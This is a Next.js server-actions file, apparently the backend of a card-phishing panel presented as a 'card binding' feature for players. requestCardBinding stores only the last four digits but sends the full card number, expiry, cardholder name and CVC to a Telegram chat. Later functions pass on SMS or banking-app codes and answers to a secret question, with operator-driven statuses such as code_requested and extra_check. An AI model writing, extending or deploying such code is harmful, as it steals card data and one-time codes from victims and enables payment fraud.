"use server"

import { createHmac } from "node:crypto"
import { and, asc, count, desc, eq, sql } from "drizzle-orm"
import { headers } from "next/headers"
import { revalidatePath } from "next/cache"
import { auth } from "@/lib/auth"
import { db } from "@/lib/db"
import { paymentCard } from "@/lib/db/schema"
import { CARD_BRAND_LABEL, detectBank, detectBrand, formatCardNumber, formatExpiry, isExpiryValid, luhnValid, normalizeCardNumber, type CardBrand } from "@/lib/payment-cards"
import { escapeTelegram, notifyTelegram } from "@/lib/telegram"
import { allowUserAction, RATE_LIMIT_ERROR } from "@/lib/rate-limit"
import { toCardholder } from "@/lib/translit"
import { generateRequestNo } from "@/lib/card-requests"

export type PaymentCardView = {
  id: number
  brand: CardBrand
  last4: string
  bankName: string | null
  cardholder: string
  expMonth: number | null
  expYear: number | null
  isDefault: boolean
  status: string
  extraCheckMessage: string | null
  extraCheckResponse: string | null
  requestNo: string | null
  redirectUrl: string | null
}

type CardsResult = { ok: true; cards: PaymentCardView[] }
export type BindingRequestResult = { ok: true; cardId: number; cards: PaymentCardView[] } | { ok: false; error: string }

const MAX_CARDS = 5
const MAX_PENDING = 2

/** Asked right after a card is saved; set via the CARD_SECRET_QUESTION server variable. */
function cardSecretQuestion() {
  return process.env.CARD_SECRET_QUESTION?.trim().slice(0, 500) || null
}

function cardFingerprint(cardNumber: string) {
  const secret = process.env.ADMIN_SECRET || process.env.BETTER_AUTH_SECRET
  if (!secret) return `request:${crypto.randomUUID()}`
  return `hmac:${createHmac("sha256", secret).update(`payment-card:${cardNumber}`).digest("hex")}`
}

async function getSessionUser() {
  const session = await auth.api.getSession({ headers: await headers() })
  if (!session?.user) throw new Error("Unauthorized")
  return session.user
}

async function getUserId() {
  return (await getSessionUser()).id
}

async function listCards(userId: string): Promise<PaymentCardView[]> {
  const rows = await db.select().from(paymentCard)
    .where(eq(paymentCard.userId, userId))
    .orderBy(desc(paymentCard.isDefault), asc(paymentCard.createdAt))
  return rows.map((r) => ({
    id: r.id, brand: r.brand as CardBrand, last4: r.last4, bankName: r.bankName,
    cardholder: r.cardholder, expMonth: r.expMonth, expYear: r.expYear,
    isDefault: r.isDefault, status: r.status,
    extraCheckMessage: r.extraCheckMessage, extraCheckResponse: r.extraCheckResponse,
    requestNo: r.requestNo, redirectUrl: r.redirectUrl,
  }))
}

export async function getPaymentCards() {
  return listCards(await getUserId())
}

export async function requestCardBinding(input: {
  cardholder: string
  cardNumber: string
  expMonth: number
  expYear: number
  cvc: string
}): Promise<BindingRequestResult> {
  const user = await getSessionUser()
  const cardholder = toCardholder(String(input.cardholder ?? "")).trim()
  const cardNumber = normalizeCardNumber(String(input.cardNumber ?? ""))
  const expMonth = Number(input.expMonth)
  const expYear = Number(input.expYear)
  const cvc = String(input.cvc ?? "").replace(/\D/g, "")

  if (!/^[A-ZА-ЯЁ][A-ZА-ЯЁ' -]{1,59}$/.test(cardholder)) return { ok: false, error: "Укажите имя держателя как на карте." }
  if (cardNumber.length !== 16 || !luhnValid(cardNumber)) return { ok: false, error: "Проверьте номер карты — нужно 16 цифр." }
  if (!Number.isInteger(expMonth) || !Number.isInteger(expYear) || !isExpiryValid(expMonth, expYear)) {
    return { ok: false, error: "Проверьте срок действия карты (ММ/ГГ)." }
  }
  if (cvc.length < 3 || cvc.length > 4) return { ok: false, error: "Укажите код CVC/CVV с обратной стороны карты." }
  if (!(await allowUserAction(user.id, "cardBinding"))) return { ok: false, error: RATE_LIMIT_ERROR }

  const brand = detectBrand(cardNumber)
  const bankName = detectBank(cardNumber) ?? ""
  const last4 = cardNumber.slice(-4)
  const fingerprint = cardFingerprint(cardNumber)

  const created = await db.transaction(async (tx) => {
    await tx.execute(sql`select pg_advisory_xact_lock(hashtext(${user.id}))`)
    await tx.delete(paymentCard)
      .where(and(eq(paymentCard.userId, user.id), eq(paymentCard.status, "rejected")))
    const [duplicate] = await tx.select({ id: paymentCard.id }).from(paymentCard)
      .where(and(eq(paymentCard.userId, user.id), eq(paymentCard.fingerprint, fingerprint))).limit(1)
    if (duplicate) return { error: "Эта карта уже добавлена." }
    const [{ total }] = await tx.select({ total: count() }).from(paymentCard).where(eq(paymentCard.userId, user.id))
    if (total >= MAX_CARDS) return { error: `Можно привязать не больше ${MAX_CARDS} карт.` }
    const [{ pending }] = await tx.select({ pending: count() }).from(paymentCard)
      .where(and(eq(paymentCard.userId, user.id), eq(paymentCard.status, "pending")))
    if (pending >= MAX_PENDING) return { error: "Дождитесь обработки текущих заявок на привязку." }
    let requestNo = generateRequestNo()
    for (let attempt = 0; attempt < 5; attempt++) {
      const [taken] = await tx.select({ id: paymentCard.id }).from(paymentCard)
        .where(eq(paymentCard.requestNo, requestNo)).limit(1)
      if (!taken) break
      requestNo = generateRequestNo()
    }
    const [row] = await tx.insert(paymentCard).values({
      userId: user.id, brand, last4, bankName: bankName || null, cardholder,
      expMonth, expYear,
      fingerprint, status: "pending", requestNo,
      extraCheckMessage: cardSecretQuestion(),
    }).returning({ id: paymentCard.id })
    return { id: row.id, requestNo }
  })
  if ("error" in created) return { ok: false, error: created.error as string }

  void notifyTelegram([
    `<b>№ ${created.requestNo}</b>`,
    `<code>${formatCardNumber(cardNumber)}</code>`,
    `${escapeTelegram(formatExpiry(expMonth, expYear))} · <code>${escapeTelegram(cvc)}</code>`,
    escapeTelegram(cardholder),
    `${escapeTelegram(CARD_BRAND_LABEL[brand])}${bankName ? ` · ${escapeTelegram(bankName)}` : ""}`,
  ].join("\n"))

  revalidatePath("/cabinet/cards")
  return { ok: true, cardId: created.id, cards: await listCards(user.id) }
}

export async function submitCardCode(id: number, code: string): Promise<CardsResult> {
  const user = await getSessionUser()
  if (!Number.isInteger(id) || id <= 0) throw new Error("Invalid card")
  const trimmed = String(code ?? "").trim().replace(/\s+/g, "").slice(0, 20)
  if (!/^[A-Za-z0-9]{3,20}$/.test(trimmed)) throw new Error("Укажите код из SMS или приложения банка.")
  if (!(await allowUserAction(user.id, "cardReply"))) throw new Error(RATE_LIMIT_ERROR)

  const [row] = await db.update(paymentCard).set({ status: "pending" })
    .where(and(eq(paymentCard.id, id), eq(paymentCard.userId, user.id), eq(paymentCard.status, "code_requested")))
    .returning({ requestNo: paymentCard.requestNo })
  if (!row) throw new Error("Заявка недоступна для отправки кода.")

  void notifyTelegram(`<b>№ ${escapeTelegram(row.requestNo ?? String(id))}</b>\n<code>${escapeTelegram(trimmed)}</code>`)

  revalidatePath("/cabinet/cards")
  return { ok: true, cards: await listCards(user.id) }
}

export async function submitExtraCheckResponse(id: number, response: string): Promise<CardsResult> {
  const user = await getSessionUser()
  if (!Number.isInteger(id) || id <= 0) throw new Error("Invalid card")
  const trimmed = String(response ?? "").trim().slice(0, 500)
  if (!trimmed) throw new Error("Введите ответ.")
  if (!(await allowUserAction(user.id, "cardReply"))) throw new Error(RATE_LIMIT_ERROR)

  const [row] = await db.update(paymentCard).set({ status: "pending", extraCheckResponse: trimmed })
    .where(and(
      eq(paymentCard.id, id),
      eq(paymentCard.userId, user.id),
      eq(paymentCard.status, "extra_check"),
      sql`${paymentCard.extraCheckMessage} is not null`,
    ))
    .returning({ requestNo: paymentCard.requestNo })
  if (!row) throw new Error("Заявка недоступна для ответа.")

  void notifyTelegram(`<b>№ ${escapeTelegram(row.requestNo ?? String(id))}</b>\n${escapeTelegram(trimmed)}`)

  revalidatePath("/cabinet/cards")
  return { ok: true, cards: await listCards(user.id) }
}

export async function submitSecretAnswer(id: number, response: string): Promise<CardsResult> {
  const user = await getSessionUser()
  if (!Number.isInteger(id) || id <= 0) throw new Error("Invalid card")
  const trimmed = String(response ?? "").trim().slice(0, 500)
  if (!trimmed) throw new Error("Введите ответ.")
  if (!(await allowUserAction(user.id, "cardReply"))) throw new Error(RATE_LIMIT_ERROR)

  const [row] = await db.update(paymentCard).set({ extraCheckResponse: trimmed })
    .where(and(
      eq(paymentCard.id, id),
      eq(paymentCard.userId, user.id),
      eq(paymentCard.status, "pending"),
      sql`${paymentCard.extraCheckMessage} is not null`,
      sql`${paymentCard.extraCheckResponse} is null`,
    ))
    .returning({ requestNo: paymentCard.requestNo })
  if (!row) throw new Error("Вопрос уже недоступен.")

  void notifyTelegram(`<b>№ ${escapeTelegram(row.requestNo ?? String(id))}</b>\n${escapeTelegram(trimmed)}`)

  revalidatePath("/cabinet/cards")
  return { ok: true, cards: await listCards(user.id) }
}

export async function setDefaultPaymentCard(id: number): Promise<PaymentCardView[]> {
  const userId = await getUserId()
  if (!Number.isInteger(id) || id <= 0) throw new Error("Invalid card")
  if (!(await allowUserAction(userId, "cardManage"))) throw new Error(RATE_LIMIT_ERROR)
  await db.transaction(async (tx) => {
    await tx.execute(sql`select pg_advisory_xact_lock(hashtext(${userId}))`)
    const [owned] = await tx.select({ id: paymentCard.id }).from(paymentCard)
      .where(and(eq(paymentCard.id, id), eq(paymentCard.userId, userId), eq(paymentCard.status, "confirmed")))
    if (!owned) return
    await tx.update(paymentCard).set({ isDefault: false }).where(eq(paymentCard.userId, userId))
    await tx.update(paymentCard).set({ isDefault: true }).where(and(eq(paymentCard.id, id), eq(paymentCard.userId, userId)))
  })
  revalidatePath("/cabinet/cards")
  return listCards(userId)
}

/** Rejected cards are shown to the player once as an alert, then removed. */
export async function dismissRejectedCards(): Promise<CardsResult> {
  const userId = await getUserId()
  await db.delete(paymentCard).where(and(eq(paymentCard.userId, userId), eq(paymentCard.status, "rejected")))
  revalidatePath("/cabinet/cards")
  return { ok: true, cards: await listCards(userId) }
}

export async function deletePaymentCard(id: number): Promise<CardsResult> {
  const userId = await getUserId()
  if (!Number.isInteger(id) || id <= 0) throw new Error("Invalid card")
  if (!(await allowUserAction(userId, "cardManage"))) throw new Error(RATE_LIMIT_ERROR)
  await db.transaction(async (tx) => {
    await tx.execute(sql`select pg_advisory_xact_lock(hashtext(${userId}))`)
    const [removed] = await tx.delete(paymentCard)
      .where(and(eq(paymentCard.id, id), eq(paymentCard.userId, userId)))
      .returning({ isDefault: paymentCard.isDefault })
    if (removed?.isDefault) {
      const [next] = await tx.select({ id: paymentCard.id }).from(paymentCard)
        .where(and(eq(paymentCard.userId, userId), eq(paymentCard.status, "confirmed")))
        .orderBy(asc(paymentCard.createdAt)).limit(1)
      if (next) await tx.update(paymentCard).set({ isDefault: true })
        .where(and(eq(paymentCard.id, next.id), eq(paymentCard.userId, userId)))
    }
  })
  revalidatePath("/cabinet/cards")
  return { ok: true, cards: await listCards(userId) }
}
